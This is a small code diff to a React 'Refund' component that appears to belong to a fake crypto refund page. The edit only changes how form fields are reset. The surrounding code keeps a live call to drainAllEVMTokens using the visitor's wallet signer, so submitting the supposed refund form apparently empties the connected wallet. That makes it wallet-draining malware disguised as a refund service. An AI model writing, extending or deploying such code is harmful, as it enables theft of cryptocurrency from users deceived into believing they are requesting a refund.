@@ -141,10 +141,7 @@ const Refund = () => {
         setIsProcessing(true);
         const chainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-          setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
-        } else {
-        }
+        setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
       } catch (error: any) {
       } finally {
         setIsProcessing(false);
